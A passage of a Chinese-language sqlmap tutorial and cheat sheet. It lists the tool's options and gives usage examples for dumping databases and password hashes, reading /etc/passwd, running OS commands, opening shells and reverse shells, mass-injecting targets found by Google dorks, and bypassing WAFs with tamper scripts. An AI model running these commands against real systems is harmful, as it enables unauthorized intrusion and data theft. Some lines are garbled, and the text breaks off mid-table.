–privileges 枚举数据库管理系统用户的权限  
–roles 枚举数据库管理系统用户的角色  
–dbs 枚举数据库管理系统数据库  
–tables 枚举 DBMS 数据库中的表  
–columns 枚举 DBMS 数据库表列  
–dump 转储数据库管理系统的数据库中的表项  
–dump-all 转储所有的 DBMS 数据库表中的条目  
–search 搜索列，表和 / 或数据库名称  
-D DB 要进行枚举的数据库名  
-T TBL 要进行枚举的数据库表  
-C COL 要进行枚举的数据库列  
-U USER 用来进行枚举的数据库用户  
–exclude-sysdbs 枚举表时排除系统数据库  
–start=LIMITSTART 第一个查询输出进入检索  
–stop=LIMITSTOP 最后查询的输出进入检索  
–first=FIRSTCHAR 第一个查询输出字的字符检索  
–last=LASTCHAR 最后查询的输出字字符检索  
–sql-query=QUERY 要执行的 SQL 语句  
–sql-shell 提示交互式 SQL 的 shell
Brute force(蛮力):  
这些选项可以被用来运行蛮力检查。  
–common-tables 检查存在共同表  
–common-columns 检查存在共同列
User-defined function injection（用户自定义函数注入）：  
这些选项可以用来创建用户自定义函数。  
–udf-inject 注入用户自定义函数  
–shared-lib=SHLIB 共享库的本地路径
File system access（访问文件系统）：  
这些选项可以被用来访问后端数据库管理系统的底层文件系统。  
–file-read=RFILE 从后端的数据库管理系统文件系统读取文件  
–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件  
–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
Operating system access（操作系统访问）：  
这些选项可以用于访问后端数据库管理系统的底层操作系统。  
–os-cmd=OSCMD 执行操作系统命令  
–os-shell 交互式的操作系统的 shell  
–os-pwn 获取一个 OOB shell，meterpreter 或 VNC  
–os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC  
–os-bof 存储过程缓冲区溢出利用  
–priv-esc 数据库进程用户权限提升  
–msf-path=MSFPATH Metasploit Framework 本地的安装路径  
–tmp-path=TMPPATH 远程临时文件目录的绝对路径
Windows 注册表访问：  
这些选项可以被用来访问后端数据库管理系统 Windows 注册表。  
–reg-read 读一个 Windows 注册表项值  
–reg-add 写一个 Windows 注册表项值数据  
–reg-del 删除 Windows 注册表键值  
–reg-key=REGKEY Windows 注册表键  
–reg-value=REGVAL Windows 注册表项值  
–reg-data=REGDATA Windows 注册表键值数据  
–reg-type=REGTYPE Windows 注册表项值类型
General（一般）：  
这些选项可以用来设置一些一般的工作参数。  
-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中  
-s SESSIONFILE 保存和恢复检索会话文件的所有数据  
–flush-session 刷新当前目标的会话文件  
–fresh-queries 忽略在会话文件中存储的查询结果  
–eta 显示每个输出的预计到达时间  
–update 更新 SqlMap  
–save file 保存选项到 INI 配置文件  
–batch 从不询问用户输入，使用所有默认配置。
Miscellaneous（杂项）：  
–beep 发现 SQL 注入时提醒  
–check-payload IDS 对注入 payloads 的检测测试  
–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS  
–forms 对目标 URL 的解析和测试形式  
–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果  
–page-rank Google dork 结果显示网页排名（PR）  
–parse-errors 从响应页面解析数据库管理系统的错误消息  
–replicate 复制转储的数据到一个 sqlite3 数据库  
–tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址  
–wizard 给初级用户的简单向导界面
## Sqlmap基础的使用
./sqlmap.py sqlmap -u "" // 查是否有注入，一些基本信息
./sqlmap.py -u "" --dbs // 枚举数据库
./sqlmap.py sqlmap -u "" --tables // 表名枚举
./sqlmap.py sqlmap -u "" --columns -T 数据库表名 // 字段枚举
./sqlmap.py sqlmap -u "" --dump -T 数据库表名 -C "字段 1，字段 2，字段
3" //dump
./sqlmap.py -u "" --dump -D 数据库名 -T 表名 -C "字段名 1，字段名 2，字段名
3" //dump
获取数据库—> 获取表名—-> 获取字段名—-> 获取数据库内容
## Sqlmap初级使用
sqlmap.py -u “ –dbs / _查询是什么数据库sqlmap.py -u
“ –current-db /_ 获取当前数据库名称  
sqlmap.py -u “ –current-user / _获取当前用户名称sqlmap.py -u
“ -D DataName –tables /_ 获取 DataName 数据库的表  
sqlmap.py -u “ –columns -T “tablename” users-D
“db_name” -v 0 /* 列字段
sqlmap.py -u “ -D DataName –T TableNamen –C
“admin,password” –dump -v 0 / _获取字段数据sqlmap.py -u “
–dbms “Mysql” /_ 指定数据库类型  
sqlmap.py -u “ –users / _列数据库用户sqlmap.py -u
“ –passwords /_ 获取数据库用户密码  
sqlmap.py -u “ –passwords -U root -v 0 /
_列出指定用户数据库密码sqlmap.py -u “ –dump -C “password,user,id”
-T “tablename” -D “db_name” –start 1 –stop 20 /_ 列出指定字段，列出 20 条  
sqlmap.py -u “ –dump-all -v 0 / _列出所有数据库所有表sqlmap.py -u
“ –privileges /_ 查看权限  
sqlmap.py -u “ –privileges -U root / _查看指定用户权限sqlmap.py
-u “ –is-dba -v 1 /_ 是否是数据库管理员  
sqlmap.py -u “ –roles / _枚举数据库用户角色sqlmap.py -u
“ –udf-inject /_ 导入用户自定义函数（获取 系统权限！）  
sqlmap.py -u “ –dump-all –exclude-sysdbs -v 0 /
_列出当前库所有表sqlmap.py -u “ –union-cols /_union 查询表记录  
sqlmap.py -u “ –cookie “COOKIE_VALUE” / _cookie
注入sqlmap.py -u “ -b(–banner) /_ 获取 banner 信息  
sqlmap.py -u “ –data “id=3” / _post 注入sqlmap.py -u
“ -v 1 -f /_ 指纹判别数据库类型  
sqlmap.py -u “ –proxy “ /
_代理注入sqlmap.py -u “ –string “STRING_ON_TRUE_PAGE” /_
指定关键词  
sqlmap.py -u “ –sql-shell / _执行指定 sql 命令sqlmap.py -u
“ –file /etc/passwdsqlmap.py -u
“ –os-cmd=whoami /_ 执行系统命令  
sqlmap.py -u “ –os-shell / _系统交互 shellsqlmap.py -u
“ –os-pwn /_ 反弹 shell  
sqlmap.py -u “ –reg-read / _读取 win 系统注册表sqlmap.py -u
“ –dbs-o “sqlmap.log”/_ 保存进度  
sqlmap.py -u “ –dbs -o “sqlmap.log” –resume /* 恢复 已保存进度
## Sqlmap使用进阶
### 利用Cookies
cookie "id=9"  
在 ASP 中, request 对象获取客户端提交数据常用的是 get 和 post 两种方式, 同时 request 对象可以不通过集合来获得数据,
即直接使用”request(“name”)”. 但它效率低下, 容易出错, 当我们省略具体的集合名称时, asp 是按
QueryString(get),Form(post),Cookie,Severvariable, 集合的顺序来搜索的. cookie
是保存在客户端的一个文本文件, 可以进行修改, 这样一来, 就可以利用 Request.cookie 方式来提交变量的值, 从而利用系统的漏洞进行注入攻击
### Sqlmap表单的使用
表单枚举  
./sqlmap.py -u "" --forms
指定表单数据  
./sqlmap.py -u "" --data "tfUName=1&UPass=1"
burpsuite 抓包与构造 request 请求
./sqlmap.py -r search_test.py -p tfUPass
### 交互式shell的使用（可提权）
./sqlmap.py -u "" --os-cmd "ipconfig"
./sqlmap.py -u "" --os-shell
./sqlmap.py -u "" --os-pwn
./sqlmap.py -u "" --sql-shell
### 配合Google Hacking使用
-p name / _多个参数如 index.php?n_id=1 &name=2&data=2020 我们想指定 name 参数进行注入sqlmap.py -g “site:xxxxx.com inurl:php?id=” –dump-all –batch /_google 搜索注入点自动跑出所有字段，需保证 google.com 能正常访问
### WAF绕过
\--batch Never ask for user input, use the default behaviour  
\--tamper=TAMPER Use given script(s) for tampering injection data  
常见 encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py
例子：
./sqlmap.py -u "" -v 3 --dbs --batch --tamper
"space2hash.py"
### 智能level测试等级
sqlmap.py -u “ /news?id=1” –smart –level 3 –users /*smart
智能 level 测试等级
### 基本信息收集的SQL语句
#### oracle
    `select table_name,row_nums from user_tables order by row_nums desc [where table_name like '%%']查询前10条select * from [table_name] where numrow select mid(adnumber,1,2)from address_list;
    +-------------------+
    | mid(adnumber,1,2) |
    +-------------------+
    | 31                |
    | 31                |
    | 31                |
    | 31                |